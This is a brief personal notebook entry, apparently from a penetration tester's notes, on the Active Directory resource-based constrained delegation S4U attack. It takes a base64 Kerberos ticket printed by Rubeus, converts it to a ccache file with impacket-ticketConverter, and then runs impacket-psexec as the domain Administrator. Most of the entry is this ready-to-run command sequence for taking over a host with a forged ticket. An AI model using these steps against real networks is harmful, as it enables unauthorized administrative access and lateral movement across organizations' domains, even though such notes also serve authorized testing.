# resource based constrained delegation S4U attack transfering tickets to attacker machine to psexec convert kirbi to ccache
tickets printed by rubeus are base64 encoded kirbi files.
convert with `impacket-ticketConverter`.
```bash
base64 -d smb.ticket.b64 > smb.ticket.kirbi
impacket-ticketConverter smb.ticket.kirbi smb.ticket.ccache
export KRB5CCNAME=$(pwd)/smb.ticket.ccache
impacket-psexec domain.local/Administrator@FQDNMachine.domain.local -k -no-pass
```

` zet/20221003151145/README.md `

# Related

- [20221013222124](/zet/20221013222124/README.md) concept hub for tricks and tips
- [20221014185652](/zet/20221014185652/README.md) kb file named kb/hacking/windows/AD-resource-based-constrained-delegation-attack.md
- ~/kb/hacking/windows/AD-resource-based-constrained-delegation-attack.md
- [20221003151144](/zet/20221003151144/README.md) active directory

Tags:

    #hacking #windows #ad #trick
